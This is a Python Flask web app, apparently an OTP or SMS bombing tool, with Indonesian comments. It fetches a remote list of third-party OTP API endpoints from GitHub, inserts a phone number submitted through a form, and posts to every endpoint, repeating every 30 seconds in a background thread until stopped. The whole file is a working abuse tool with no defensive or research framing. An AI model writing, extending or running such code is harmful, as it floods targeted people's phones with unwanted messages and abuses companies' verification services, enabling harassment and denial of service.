from flask import Flask, render_template, request, redirect, url_for, flash
import requests
import threading
import time

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# URL GitHub Raw untuk file JSON konfigurasi OTP
JSON_CONFIG_URL = "https://raw.githubusercontent.com/YoshCasaster/verifikasi-sotp/main/otp_config.json"

# Variabel untuk kontrol pengiriman terus-menerus
loop_running = False
stop_event = threading.Event()

# Fungsi untuk mengirim OTP
def send_otp_requests(phone_number):
    responses = []
    try:
        response = requests.get(JSON_CONFIG_URL)
        config = response.json()

        for item in config:
            api_url = item.get("url")
            data = item.get("data").replace("target_number", phone_number)
            headers = item.get("headers")
            response = requests.post(api_url, headers=headers, data=data)
            responses.append(response.text)
        return responses
    except Exception as e:
        return [f"Gagal mengambil konfigurasi OTP: {e}"]

def start_sending_otp(phone_number):
    global loop_running
    loop_running = True
    stop_event.clear()

    while loop_running and not stop_event.is_set():
        otp_responses = send_otp_requests(phone_number)
        time.sleep(30)  # Tunggu 30 detik sebelum mengirim lagi

    return otp_responses

@app.route('/', methods=['GET', 'POST'])
def home():
    return render_template('home.html')

@app.route('/otp', methods=['POST'])
def otp():
    phone_number = request.form['phone']
    global loop_running
    if not loop_running:
        threading.Thread(target=start_sending_otp, args=(phone_number,), daemon=True).start()
    return redirect(url_for('home'))

@app.route('/stop', methods=['POST'])
def stop():
    global loop_running
    loop_running = False
    stop_event.set()
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
